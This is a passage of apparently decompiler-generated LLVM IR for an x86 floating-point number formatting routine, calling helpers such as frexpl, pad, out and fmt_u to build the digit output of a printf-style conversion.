  %v0_80525b4 = call i32 @__fpclassifyl()
  %v0_80525b9 = load i32, i32* @esp, align 4
  %v1_80525bc = add i32 %v0_80525b4, -1
  %v5_80525bc = sub i32 0, %v0_80525b4
  %v6_80525bc = and i32 %v0_80525b4, %v5_80525bc
  %v7_80525bc = icmp slt i32 %v6_80525bc, 0
  %v8_80525bc = icmp eq i32 %v1_80525bc, 0
  %v9_80525bc = icmp slt i32 %v1_80525bc, 0
  store i32 %v1_80525bc, i32* %eax.global-to-local, align 4
  %v3_80525bd = icmp eq i1 %v9_80525bc, %v7_80525bc
  %v4_80525bd = icmp eq i1 %v8_80525bc, false
  %v5_80525bd = and i1 %v4_80525bd, %v3_80525bd
  br i1 %v5_80525bd, label %dec_label_pc_8052658, label %dec_label_pc_80525c3

dec_label_pc_80525c3:                             ; preds = %dec_label_pc_805259e
  %v1_80525c3 = add i32 %v0_80525b9, 84
  %v2_80525c3 = inttoptr i32 %v1_80525c3 to i32*
  %v3_80525c3 = load i32, i32* %v2_80525c3, align 4
  %v1_80525c7 = and i32 %v3_80525c3, 32
  %v2_80525c7 = icmp eq i32 %v1_80525c7, 0
  store i32 %v1_80525c7, i32* %edx.global-to-local, align 4
  %. = select i1 %v2_80525c7, i32 ptrtoint ([4 x i8]* @global_var_8054a48.401 to i32), i32 ptrtoint ([4 x i8]* @global_var_8054a44.400 to i32)
  store i32 %., i32* @esi, align 4
  %v1_80525d8 = add i32 %v0_80525b9, 7808
  %v2_80525d8 = inttoptr i32 %v1_80525d8 to x86_fp80*
  %v3_80525d8 = load x86_fp80, x86_fp80* %v2_80525d8, align 4
  store x86_fp80 %v3_80525d8, x86_fp80* %st0.global-to-local, align 4
  %v1_80525e3 = udiv i32 %v1_80525bc, 256
  %tmp547 = and i32 %v1_80525e3, 68
  %tmp548 = icmp eq i32 %tmp547, 64
  br i1 %tmp548, label %dec_label_pc_80525f6, label %dec_label_pc_80525e8

dec_label_pc_80525e8:                             ; preds = %dec_label_pc_80525c3
  %v1_80525ef = icmp eq i1 %v2_80525c7, false
  %.56 = select i1 %v1_80525ef, i32 ptrtoint ([4 x i8]* @global_var_8054a4c.402 to i32), i32 ptrtoint ([4 x i8]* @global_var_8054a50.403 to i32)
  store i32 %.56, i32* @esi, align 4
  br label %dec_label_pc_80525f6

dec_label_pc_80525f6:                             ; preds = %dec_label_pc_80525c3, %dec_label_pc_80525e8
  %v1_80525f6 = add i32 %v0_80525b9, 96
  %v2_80525f6 = inttoptr i32 %v1_80525f6 to i32*
  %v3_80525f6 = load i32, i32* %v2_80525f6, align 4
  store i32 %v3_80525f6, i32* %ebx.global-to-local, align 4
  store i32 32, i32* @edx, align 4
  %v0_80525ff = load i32, i32* @ebp, align 4
  %v2_80525ff = add i32 %v0_80525b9, 12
  %v3_80525ff = inttoptr i32 %v2_80525ff to i32*
  store i32 %v0_80525ff, i32* %v3_80525ff, align 4
  %v0_8052600 = load i32, i32* @ebp, align 4
  %v2_8052600 = add i32 %v0_80525b9, 8
  %v3_8052600 = inttoptr i32 %v2_8052600 to i32*
  store i32 %v0_8052600, i32* %v3_8052600, align 4
  %v1_8052601 = add i32 %v0_80525b9, 60
  %v2_8052601 = inttoptr i32 %v1_8052601 to i32*
  %v3_8052601 = load i32, i32* %v2_8052601, align 4
  %v0_8052605 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052605 = add i32 %v0_8052605, 3
  store i32 %v1_8052605, i32* @ebx, align 4
  %v1_8052608 = and i32 %v3_8052601, -65537
  store i32 %v1_8052608, i32* %eax.global-to-local, align 4
  %v2_805260d = add i32 %v0_80525b9, 4
  %v3_805260d = inttoptr i32 %v2_805260d to i32*
  store i32 %v1_8052608, i32* %v3_805260d, align 4
  %v0_805260e = load i32, i32* @ebx, align 4
  %v3_805260e = inttoptr i32 %v0_80525b9 to i32*
  store i32 %v0_805260e, i32* %v3_805260e, align 4
  %v1_805260f = add i32 %v0_80525b9, 64
  %v2_805260f = inttoptr i32 %v1_805260f to i32*
  %v3_805260f = load i32, i32* %v2_805260f, align 4
  store i32 %v3_805260f, i32* @ecx, align 4
  %v1_8052613 = add i32 %v0_80525b9, 52
  %v2_8052613 = inttoptr i32 %v1_8052613 to i32*
  %v3_8052613 = load i32, i32* %v2_8052613, align 4
  store i32 %v3_8052613, i32* @eax, align 4
  %v0_8052617 = call i32 @pad()
  store i32 %v0_8052617, i32* %eax.global-to-local, align 4
  %v0_805261c = load i32, i32* @esp, align 4
  %v1_805261c = add i32 %v0_805261c, 96
  %v2_805261c = inttoptr i32 %v1_805261c to i32*
  %v3_805261c = load i32, i32* %v2_805261c, align 4
  store i32 %v3_805261c, i32* @ecx, align 4
  %v1_8052620 = add i32 %v0_805261c, 100
  %v2_8052620 = inttoptr i32 %v1_8052620 to i32*
  %v3_8052620 = load i32, i32* %v2_8052620, align 4
  store i32 %v3_8052620, i32* @edx, align 4
  %v1_8052624 = add i32 %v0_805261c, 52
  %v2_8052624 = inttoptr i32 %v1_8052624 to i32*
  %v3_8052624 = load i32, i32* %v2_8052624, align 4
  store i32 %v3_8052624, i32* @eax, align 4
  %v0_8052628 = call i32 @out()
  store i32 %v0_8052628, i32* %eax.global-to-local, align 4
  %v0_805262d = load i32, i32* @esp, align 4
  %v1_805262d = add i32 %v0_805262d, 52
  %v2_805262d = inttoptr i32 %v1_805262d to i32*
  %v3_805262d = load i32, i32* %v2_805262d, align 4
  store i32 %v3_805262d, i32* @eax, align 4
  %v0_8052631 = load i32, i32* @esi, align 4
  store i32 %v0_8052631, i32* @edx, align 4
  store i32 3, i32* @ecx, align 4
  %v0_8052638 = call i32 @out()
  store i32 %v0_8052638, i32* %eax.global-to-local, align 4
  %v0_805263d = load i32, i32* @esp, align 4
  %v1_805263d = inttoptr i32 %v0_805263d to i32*
  %v2_805263d = load i32, i32* %v1_805263d, align 4
  store i32 %v2_805263d, i32* @esi, align 4
  %v3_805263d = add i32 %v0_805263d, 4
  %v1_805263e = inttoptr i32 %v3_805263d to i32*
  %v2_805263e = load i32, i32* %v1_805263e, align 4
  store i32 %v2_805263e, i32* %edi.global-to-local, align 4
  %v3_805263e = add i32 %v0_805263d, 8
  br label %dec_label_pc_805263f

dec_label_pc_805263f:                             ; preds = %dec_label_pc_8052505, %dec_label_pc_80525f6
  %storemerge7 = phi i32 [ %v3_805263e, %dec_label_pc_80525f6 ], [ %v2_8052506, %dec_label_pc_8052505 ]
  %v1_805263f = add i32 %storemerge7, 52
  %v2_805263f = inttoptr i32 %v1_805263f to i32*
  %v3_805263f = load i32, i32* %v2_805263f, align 4
  %v4_805263f = xor i32 %v3_805263f, 8192
  store i32 %v4_805263f, i32* %v2_805263f, align 4
  store i32 32, i32* @edx, align 4
  %v0_805264c = load i32, i32* @esp, align 4
  %v1_805264c = add i32 %v0_805264c, 52
  %v2_805264c = inttoptr i32 %v1_805264c to i32*
  %v3_805264c = load i32, i32* %v2_805264c, align 4
  %v5_805264c = add i32 %v0_805264c, -4
  %v6_805264c = inttoptr i32 %v5_805264c to i32*
  store i32 %v3_805264c, i32* %v6_805264c, align 4
  %v0_8052650 = load i32, i32* @ebx, align 4
  store i32 %v0_8052650, i32* @edi, align 4
  %v2_8052652 = add i32 %v0_805264c, -8
  %v3_8052652 = inttoptr i32 %v2_8052652 to i32*
  store i32 %v0_8052650, i32* %v3_8052652, align 4
  br label %dec_label_pc_80529be

dec_label_pc_8052658:                             ; preds = %dec_label_pc_805259e
  %v1_8052658 = add i32 %v0_80525b9, 7844
  store i32 %v1_8052658, i32* %edx.global-to-local, align 4
  %v2_805265f = add i32 %v0_80525b9, 12
  %v3_805265f = inttoptr i32 %v2_805265f to i32*
  store i32 %v1_8052658, i32* %v3_805265f, align 4
  %v1_8052660 = add i32 %v0_80525b9, 7816
  %v2_8052660 = inttoptr i32 %v1_8052660 to i32*
  %v3_8052660 = load i32, i32* %v2_8052660, align 4
  %v5_8052660 = add i32 %v0_80525b9, 8
  %v6_8052660 = inttoptr i32 %v5_8052660 to i32*
  store i32 %v3_8052660, i32* %v6_8052660, align 4
  %v1_8052667 = add i32 %v0_80525b9, 7812
  %v2_8052667 = inttoptr i32 %v1_8052667 to i32*
  %v3_8052667 = load i32, i32* %v2_8052667, align 4
  %v5_8052667 = add i32 %v0_80525b9, 4
  %v6_8052667 = inttoptr i32 %v5_8052667 to i32*
  store i32 %v3_8052667, i32* %v6_8052667, align 4
  %v1_805266e = add i32 %v0_80525b9, 7808
  %v2_805266e = inttoptr i32 %v1_805266e to i32*
  %v3_805266e = load i32, i32* %v2_805266e, align 4
  %v6_805266e = inttoptr i32 %v0_80525b9 to i32*
  store i32 %v3_805266e, i32* %v6_805266e, align 4
  %v9_8052675 = call i32 @frexpl(x86_fp80 %v8_8052675, i32 %v0_8051ddc, i32 %v0_8051dd1, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_8052675, i32* %eax.global-to-local, align 4
  %v0_805267a = load i3, i3* @fpu_stat_TOP, align 1
  %v1_805267a = load x86_fp80, x86_fp80* @st0, align 4
  %v2_805267a = load i32, i32* @esp, align 4
  %v3_805267a = add i32 %v2_805267a, 7728
  %v4_805267a = inttoptr i32 %v3_805267a to x86_fp80*
  store x86_fp80 %v1_805267a, x86_fp80* %v4_805267a, align 4
  %v5_805267a = add i3 %v0_805267a, 1
  %v3_8052688 = fadd x86_fp80 %v1_805267a, %v1_805267a
  store x86_fp80 %v3_8052688, x86_fp80* %st0.global-to-local, align 4
  %v3_805268a = add i32 %v2_805267a, 7632
  %v4_805268a = inttoptr i32 %v3_805268a to x86_fp80*
  store x86_fp80 %v3_8052688, x86_fp80* %v4_805268a, align 4
  %v1_8052694 = add i32 %v2_805267a, 84
  %v2_8052694 = inttoptr i32 %v1_8052694 to i32*
  %v3_8052694 = load i32, i32* %v2_8052694, align 4
  store x86_fp80 %v3_8052688, x86_fp80* %st0.global-to-local, align 4
  %v1_805269f = add i3 %v0_805267a, -1
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_805269f, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80526a5 = udiv i32 %v9_8052675, 256
  %v2_80526a5 = trunc i32 %v1_80526a5 to i8
  %v5_80526a5 = and i8 %v2_80526a5, 4
  %v6_80526a5 = icmp ne i8 %v5_80526a5, 0
  %v9_80526a5 = and i8 %v2_80526a5, 64
  %v10_80526a5 = icmp ne i8 %v9_80526a5, 0
  %v1_80526a6 = icmp eq i1 %v10_80526a5, false
  %v2_80526a6 = zext i1 %v1_80526a6 to i32
  %v1_80526a9 = zext i1 %v6_80526a5 to i32
  %v2_80526a9 = load i32, i32* @edx, align 4
  %v3_80526a9 = and i32 %v2_80526a9, -256
  %v4_80526a9 = or i32 %v3_80526a9, %v1_80526a9
  store i32 %v4_80526a9, i32* %edx.global-to-local, align 4
  %v2_80526ac = or i32 %v2_80526a6, %v1_80526a9
  %v1_80526ae = or i32 %v3_8052694, 32
  store i32 %v1_80526ae, i32* %ecx.global-to-local, align 4
  store i32 %v2_80526ac, i32* %eax.global-to-local, align 4
  %v1_80526b4 = add i32 %v2_805267a, 7844
  %v2_80526b4 = inttoptr i32 %v1_80526b4 to i32*
  %v3_80526b4 = load i32, i32* %v2_80526b4, align 4
  %v5_80526b4 = sub i32 %v3_80526b4, %v2_80526ac
  store i32 %v5_80526b4, i32* %v2_80526b4, align 4
  %v0_80526bb = load i32, i32* %ecx.global-to-local, align 4
  %v9_80526bb = icmp eq i32 %v0_80526bb, 97
  %v1_80526be = load i32, i32* @esp, align 4
  %v2_80526be = add i32 %v1_80526be, 92
  %v3_80526be = inttoptr i32 %v2_80526be to i32*
  store i32 %v0_80526bb, i32* %v3_80526be, align 4
  %v1_80526c2 = icmp eq i1 %v9_80526bb, false
  br i1 %v1_80526c2, label %dec_label_pc_80529d3, label %dec_label_pc_80526c8

dec_label_pc_80526c8:                             ; preds = %dec_label_pc_8052658
  %v1_80526c8 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80526c8, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v0_80526cc = load i32, i32* @esp, align 4
  %v1_80526cc = add i32 %v0_80526cc, 68
  %v2_80526cc = inttoptr i32 %v1_80526cc to i8*
  %v3_80526cc = load i8, i8* %v2_80526cc, align 1
  %v4_80526cc = and i8 %v3_80526cc, 32
  %v5_80526cc = icmp eq i8 %v4_80526cc, 0
  br i1 %v5_80526cc, label %dec_label_pc_80526d8, label %dec_label_pc_80526d3

dec_label_pc_80526d3:                             ; preds = %dec_label_pc_80526c8
  %v1_80526d3 = add i32 %v0_80526cc, 84
  %v2_80526d3 = inttoptr i32 %v1_80526d3 to i32*
  %v3_80526d3 = load i32, i32* %v2_80526d3, align 4
  %v4_80526d3 = add i32 %v3_80526d3, 9
  store i32 %v4_80526d3, i32* %v2_80526d3, align 4
  %v0_80526d8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80526d8

dec_label_pc_80526d8:                             ; preds = %dec_label_pc_80526c8, %dec_label_pc_80526d3
  %v1_80526e4 = phi i32 [ %v0_80526cc, %dec_label_pc_80526c8 ], [ %v0_80526d8.pre, %dec_label_pc_80526d3 ]
  %v1_80526d8 = add i32 %v1_80526e4, 80
  %v2_80526d8 = inttoptr i32 %v1_80526d8 to i32*
  %v3_80526d8 = load i32, i32* %v2_80526d8, align 4
  %v1_80526dc = add i32 %v3_80526d8, 2
  store i32 %v1_80526dc, i32* %ebx.global-to-local, align 4
  %v1_80526df = add i32 %v1_80526e4, 52
  %v2_80526df = inttoptr i32 %v1_80526df to i32*
  %v3_80526df = load i32, i32* %v2_80526df, align 4
  %v2_80526e4 = add i32 %v1_80526e4, 116
  %v3_80526e4 = inttoptr i32 %v2_80526e4 to i32*
  store i32 %v1_80526dc, i32* %v3_80526e4, align 4
  %tmp549 = icmp ult i32 %v3_80526df, 15
  br i1 %tmp549, label %dec_label_pc_80526ee, label %dec_label_pc_80526d8.dec_label_pc_80527a2_crit_edge

dec_label_pc_80526d8.dec_label_pc_80527a2_crit_edge: ; preds = %dec_label_pc_80526d8
  %v0_80527a2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80527a2

dec_label_pc_80526ee:                             ; preds = %dec_label_pc_80526d8
  store i32 15, i32* %eax.global-to-local, align 4
  %v1_80526f3 = load i32, i32* @esp, align 4
  %v2_80526f3 = add i32 %v1_80526f3, 52
  %v3_80526f3 = inttoptr i32 %v2_80526f3 to i32*
  %v4_80526f3 = load i32, i32* %v3_80526f3, align 4
  %v5_80526f3 = sub i32 15, %v4_80526f3
  %v15_80526f3 = icmp eq i32 %v5_80526f3, 0
  store i32 %v5_80526f3, i32* %eax.global-to-local, align 4
  br i1 %v15_80526f3, label %dec_label_pc_80527a2, label %dec_label_pc_80526fd

dec_label_pc_80526fd:                             ; preds = %dec_label_pc_80526ee
  %v1_80526fd = add i32 %v1_80526f3, 7760
  %v2_80526fd = inttoptr i32 %v1_80526fd to i32*
  store i32 0, i32* %v2_80526fd, align 4
  %v0_8052708 = load i32, i32* @esp, align 4
  %v1_8052708 = add i32 %v0_8052708, 7764
  %v2_8052708 = inttoptr i32 %v1_8052708 to i32*
  store i32 -2147483648, i32* %v2_8052708, align 4
  %v0_8052713 = load i32, i32* @esp, align 4
  %v1_8052713 = add i32 %v0_8052713, 7768
  %v2_8052713 = inttoptr i32 %v1_8052713 to i32*
  store i32 16386, i32* %v2_8052713, align 4
  %v0_8052720 = load i32, i32* @esp, align 4
  %v1_8052720 = add i32 %v0_8052720, 7760
  %v2_8052720 = inttoptr i32 %v1_8052720 to x86_fp80*
  %eax.promoted = load i32, i32* %eax.global-to-local, align 4
  %v1_8052734333 = add i32 %eax.promoted, -1
  %v10_8052735334 = icmp eq i32 %eax.promoted, 0
  %v1_8052738335 = icmp eq i1 %v10_8052735334, false
  br i1 %v1_8052738335, label %dec_label_pc_8052720.lr.ph, label %dec_label_pc_805273a

dec_label_pc_8052720.lr.ph:                       ; preds = %dec_label_pc_80526fd
  %v3_8052720.pre = load x86_fp80, x86_fp80* %v2_8052720, align 4
  br label %dec_label_pc_8052720

dec_label_pc_8052720:                             ; preds = %dec_label_pc_8052720.lr.ph, %dec_label_pc_8052720
  %v3_8052720 = phi x86_fp80 [ %v3_8052720.pre, %dec_label_pc_8052720.lr.ph ], [ %v4_8052727, %dec_label_pc_8052720 ]
  %v1_8052734336 = phi i32 [ %v1_8052734333, %dec_label_pc_8052720.lr.ph ], [ %v1_8052734, %dec_label_pc_8052720 ]
  %v4_8052727 = fmul x86_fp80 %v3_8052720, 0xK40038000000000000000
  store x86_fp80 %v4_8052727, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 %v4_8052727, x86_fp80* %v2_8052720, align 4
  %v1_8052734 = add i32 %v1_8052734336, -1
  %v10_8052735 = icmp eq i32 %v1_8052734336, 0
  %v1_8052738 = icmp eq i1 %v10_8052735, false
  br i1 %v1_8052738, label %dec_label_pc_8052720, label %dec_label_pc_8052734.dec_label_pc_805273a_crit_edge

dec_label_pc_8052734.dec_label_pc_805273a_crit_edge: ; preds = %dec_label_pc_8052720
  store i3 %v5_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805273a

dec_label_pc_805273a:                             ; preds = %dec_label_pc_8052734.dec_label_pc_805273a_crit_edge, %dec_label_pc_80526fd
  %v1_8052734.lcssa = phi i32 [ %v1_8052734, %dec_label_pc_8052734.dec_label_pc_805273a_crit_edge ], [ %v1_8052734333, %dec_label_pc_80526fd ]
  store i32 %v1_8052734.lcssa, i32* %eax.global-to-local, align 4
  %v1_805273a = add i32 %v0_8052720, 84
  %v2_805273a = inttoptr i32 %v1_805273a to i32*
  %v3_805273a = load i32, i32* %v2_805273a, align 4
  store i32 %v3_805273a, i32* @esi, align 4
  %v1_805273e = add i32 %v0_8052720, 7616
  %v2_805273e = inttoptr i32 %v1_805273e to x86_fp80*
  %v3_805273e = load x86_fp80, x86_fp80* %v2_805273e, align 4
  store x86_fp80 %v3_805273e, x86_fp80* %st0.global-to-local, align 4
  store i3 %v0_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8052745 = inttoptr i32 %v3_805273a to i8*
  %v2_8052745 = load i8, i8* %v1_8052745, align 1
  %v11_8052745 = icmp eq i8 %v2_8052745, 45
  %v3_8052748 = load x86_fp80, x86_fp80* %v2_8052720, align 4
  store x86_fp80 %v3_8052748, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_805269f, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_805274f = icmp eq i1 %v11_8052745, false
  br i1 %v1_805274f, label %dec_label_pc_8052787, label %dec_label_pc_8052751

dec_label_pc_8052751:                             ; preds = %dec_label_pc_805273a
  store x86_fp80 %v3_8052748, x86_fp80* %st0.global-to-local, align 4
  %v2_8052753 = fsub x86_fp80 0xK80000000000000000000, %v3_805273e
  %v3_8052755 = add i32 %v0_8052720, 7600
  %v4_8052755 = inttoptr i32 %v3_8052755 to x86_fp80*
  store x86_fp80 %v2_8052753, x86_fp80* %v4_8052755, align 4
  %v2_8052763 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v4_8052763 = fadd x86_fp80 %v3_805273e, %v2_8052763
  store x86_fp80 %v4_8052763, x86_fp80* %st0.global-to-local, align 4
  %v3_8052765 = add i32 %v0_8052720, 7584
  %v4_8052765 = inttoptr i32 %v3_8052765 to x86_fp80*
  store x86_fp80 %v2_8052753, x86_fp80* %v4_8052765, align 4
  store x86_fp80 %v2_8052753, x86_fp80* %st1.global-to-local, align 4
  %v2_8052773 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v4_8052773 = fsub x86_fp80 %v2_8052773, %v3_805273e
  %v3_8052775 = add i32 %v0_8052720, 7568
  %v4_8052775 = inttoptr i32 %v3_8052775 to x86_fp80*
  store x86_fp80 %v4_8052773, x86_fp80* %v4_8052775, align 4
  store i3 %v0_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8052783 = fsub x86_fp80 0xK80000000000000000000, %v4_8052773
  store x86_fp80 %v2_8052783, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805279b

dec_label_pc_8052787:                             ; preds = %dec_label_pc_805273a
  %v4_8052787 = fadd x86_fp80 %v3_805273e, %v3_8052748
  store x86_fp80 %v3_8052748, x86_fp80* %st0.global-to-local, align 4
  %v3_805278b = add i32 %v0_8052720, 7552
  %v4_805278b = inttoptr i32 %v3_805278b to x86_fp80*
  store x86_fp80 %v4_8052787, x86_fp80* %v4_805278b, align 4
  store x86_fp80 %v4_8052787, x86_fp80* %st1.global-to-local, align 4
  %v2_8052799 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v4_8052799 = fsub x86_fp80 %v2_8052799, %v4_8052787
  store x86_fp80 %v4_8052799, x86_fp80* %st0.global-to-local, align 4
  store i3 %v0_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805279b

dec_label_pc_805279b:                             ; preds = %dec_label_pc_8052751, %dec_label_pc_8052787
  %v1_805279b = phi x86_fp80 [ %v2_8052783, %dec_label_pc_8052751 ], [ %v4_8052799, %dec_label_pc_8052787 ]
  store x86_fp80 %v1_805279b, x86_fp80* %v2_805273e, align 4
  store i3 %v5_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80527a2

dec_label_pc_80527a2:                             ; preds = %dec_label_pc_80526d8.dec_label_pc_80527a2_crit_edge, %dec_label_pc_80526ee, %dec_label_pc_805279b
  %v1_80527b5 = phi i32 [ %v0_80527a2.pre, %dec_label_pc_80526d8.dec_label_pc_80527a2_crit_edge ], [ %v1_80526f3, %dec_label_pc_80526ee ], [ %v0_8052720, %dec_label_pc_805279b ]
  %v1_80527a2 = add i32 %v1_80527b5, 7828
  %v2_80527a2 = inttoptr i32 %v1_80527a2 to i32*
  %v3_80527a2 = load i32, i32* %v2_80527a2, align 4
  %v1_80527a9 = add i32 %v1_80527b5, 7792
  store i32 %v1_80527a9, i32* @ebx, align 4
  %v2_80527b0 = ashr i32 %v3_80527a2, 31
  store i32 %v2_80527b0, i32* %ecx.global-to-local, align 4
  store i32 %v2_80527b0, i32* %eax.global-to-local, align 4
  %v4_80527b5 = load i32, i32* %v2_80527a2, align 4
  %v5_80527b5 = xor i32 %v4_80527b5, %v2_80527b0
  %v2_80527bc = sub i32 %v5_80527b5, %v2_80527b0
  store i32 %v2_80527bc, i32* @eax, align 4
  store i32 %v1_80527a9, i32* @ecx, align 4
  %v1_80527c0 = ashr i32 %v2_80527bc, 31
  store i32 %v1_80527c0, i32* @edx, align 4
  %v0_80527c1 = call i32 @fmt_u()
  store i32 %v0_80527c1, i32* %eax.global-to-local, align 4
  %v1_80527c6 = load i32, i32* @ebx, align 4
  %v12_80527c6 = icmp eq i32 %v0_80527c1, %v1_80527c6
  store i32 %v0_80527c1, i32* %edx.global-to-local, align 4
  %v1_80527ca = icmp eq i1 %v12_80527c6, false
  %v0_80527db.pre = load i32, i32* @esp, align 4
  br i1 %v1_80527ca, label %dec_label_pc_80527db, label %dec_label_pc_80527cc

dec_label_pc_80527cc:                             ; preds = %dec_label_pc_80527a2
  %v1_80527cc = add i32 %v0_80527db.pre, 7791
  %v2_80527cc = inttoptr i32 %v1_80527cc to i8*
  store i8 48, i8* %v2_80527cc, align 1
  %v0_80527d4 = load i32, i32* @esp, align 4
  %v1_80527d4 = add i32 %v0_80527d4, 7791
  store i32 %v1_80527d4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80527db

dec_label_pc_80527db:                             ; preds = %dec_label_pc_80527a2, %dec_label_pc_80527cc
  %v2_80527f2 = phi i32 [ %v1_80527d4, %dec_label_pc_80527cc ], [ %v0_80527c1, %dec_label_pc_80527a2 ]
  %v0_80527db = phi i32 [ %v0_80527d4, %dec_label_pc_80527cc ], [ %v0_80527db.pre, %dec_label_pc_80527a2 ]
  %v1_80527db = add i32 %v0_80527db, 7828
  %v2_80527db = inttoptr i32 %v1_80527db to i32*
  %v3_80527db = load i32, i32* %v2_80527db, align 4
  %v1_80527e2 = add i32 %v0_80527db, 7527
  store i32 %v1_80527e2, i32* %ebx.global-to-local, align 4
  %v2_80527e9 = ashr i32 %v3_80527db, 31
  %v1_80527ec = and i32 %v2_80527e9, 2
  %v1_80527ef = add nuw nsw i32 %v1_80527ec, 43
  %v11_80527ef = trunc i32 %v1_80527ef to i8
  %v3_80527f2 = add i32 %v2_80527f2, -1
  %v4_80527f2 = inttoptr i32 %v3_80527f2 to i8*
  store i8 %v11_80527ef, i8* %v4_80527f2, align 1
  %v0_80527f5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80527f5 = add i32 %v0_80527f5, -2
  store i32 %v1_80527f5, i32* %eax.global-to-local, align 4
  %v1_80527f8 = load i32, i32* @esp, align 4
  %v2_80527f8 = add i32 %v1_80527f8, 76
  %v3_80527f8 = inttoptr i32 %v2_80527f8 to i32*
  store i32 %v1_80527f5, i32* %v3_80527f8, align 4
  %v0_80527fc = load i32, i32* @esp, align 4
  %v1_80527fc = add i32 %v0_80527fc, 68
  %v2_80527fc = inttoptr i32 %v1_80527fc to i8*
  %v3_80527fc = load i8, i8* %v2_80527fc, align 1
  %v4_80527fc = zext i8 %v3_80527fc to i32
  %v5_80527fc = load i32, i32* %eax.global-to-local, align 4
  %v6_80527fc = and i32 %v5_80527fc, -256
  %v7_80527fc = or i32 %v6_80527fc, %v4_80527fc
  %v1_8052800 = add i32 %v7_80527fc, 15
  %v10_8052800 = trunc i32 %v1_8052800 to i8
  store i32 %v1_8052800, i32* %eax.global-to-local, align 4
  %v2_8052803 = load i32, i32* %edx.global-to-local, align 4
  %v3_8052803 = add i32 %v2_8052803, -2
  %v4_8052803 = inttoptr i32 %v3_8052803 to i8*
  store i8 %v10_8052800, i8* %v4_8052803, align 1
  %v0_8052806 = load i32, i32* @esp, align 4
  %v1_8052806 = add i32 %v0_8052806, 68
  %v2_8052806 = inttoptr i32 %v1_8052806 to i8*
  %v3_8052806 = load i8, i8* %v2_8052806, align 1
  %v4_8052806 = zext i8 %v3_8052806 to i32
  %v5_8052806 = load i32, i32* @ecx, align 4
  %v6_8052806 = and i32 %v5_8052806, -256
  %v7_8052806 = or i32 %v6_8052806, %v4_8052806
  store i32 %v7_8052806, i32* %ecx.global-to-local, align 4
  %v1_8052811 = add i32 %v0_8052806, 142
  %v2_8052811 = inttoptr i32 %v1_8052811 to i16*
  %v3_8052811 = load i16, i16* %v2_8052811, align 2
  %v5_8052811 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052811 = and i32 %v5_8052811, -65536
  %v1_8052819 = and i32 %v4_8052806, 32
  store i32 %v1_8052819, i32* %ecx.global-to-local, align 4
  %v1_805281c = udiv i16 %v3_8052811, 256
  %v2_805281c = zext i16 %v1_805281c to i32
  %v3_805281c = or i32 %v2_805281c, 12
  %v10_805281c = mul nuw nsw i32 %v3_805281c, 256
  %tmp550 = urem i16 %v3_8052811, 256
  %v4_8052811.masked = zext i16 %tmp550 to i32
  %v11_805281c = or i32 %v6_8052811, %v4_8052811.masked
  %v12_805281c = or i32 %v11_805281c, %v10_805281c
  store i32 %v12_805281c, i32* %eax.global-to-local, align 4
  %v1_805281f = trunc i32 %v12_805281c to i16
  %v3_805281f = add i32 %v0_8052806, 140
  %v4_805281f = inttoptr i32 %v3_805281f to i16*
  store i16 %v1_805281f, i16* %v4_805281f, align 2
  %v0_8052827.pre = load i32, i32* @esp, align 4
  %v4_8052827.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8052827

dec_label_pc_8052827:                             ; preds = %dec_label_pc_80528be, %dec_label_pc_80527db
  %v4_8052827 = phi i3 [ %v4_8052827.pre, %dec_label_pc_80527db ], [ %v4_80528be, %dec_label_pc_80528be ]
  %v3_8052835 = phi i32 [ %v0_8052827.pre, %dec_label_pc_80527db ], [ %v1_805291d, %dec_label_pc_80528be ]
  %v1_8052827 = add i32 %v3_8052835, 7616
  %v2_8052827 = inttoptr i32 %v1_8052827 to x86_fp80*
  %v3_8052827 = load x86_fp80, x86_fp80* %v2_8052827, align 4
  store x86_fp80 %v3_8052827, x86_fp80* %st0.global-to-local, align 4
  %v2_8052835 = fptosi x86_fp80 %v3_8052827 to i32
  %v4_8052835 = add i32 %v3_8052835, 124
  %v5_8052835 = inttoptr i32 %v4_8052835 to i32*
  store i32 %v2_8052835, i32* %v5_8052835, align 4
  store i3 %v4_8052827, i3* %fpu_stat_TOP.global-to-local, align 1
  %v0_8052840 = load i32, i32* @esp, align 4
  %v1_8052840 = add i32 %v0_8052840, 124
  %v2_8052840 = inttoptr i32 %v1_8052840 to i32*
  %v3_8052840 = load i32, i32* %v2_8052840, align 4
  store i32 %v3_8052840, i32* %edx.global-to-local, align 4
  %v1_8052844 = add i32 %v3_8052840, 134564368
  %v2_8052844 = inttoptr i32 %v1_8052844 to i8*
  %v3_8052844 = load i8, i8* %v2_8052844, align 1
  %v4_8052844 = zext i8 %v3_8052844 to i32
  %v1_805284a = load i32, i32* %ecx.global-to-local, align 4
  %v2_805284a = or i32 %v1_805284a, %v4_8052844
  %v5_805284a = trunc i32 %v2_805284a to i8
  %v2_805284c = load i32, i32* %ebx.global-to-local, align 4
  %v3_805284c = inttoptr i32 %v2_805284c to i8*
  store i8 %v5_805284a, i8* %v3_805284c, align 1
  %v0_805284e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805284e = add i32 %v0_805284e, 1
  store i32 %v1_805284e, i32* %ebx.global-to-local, align 4
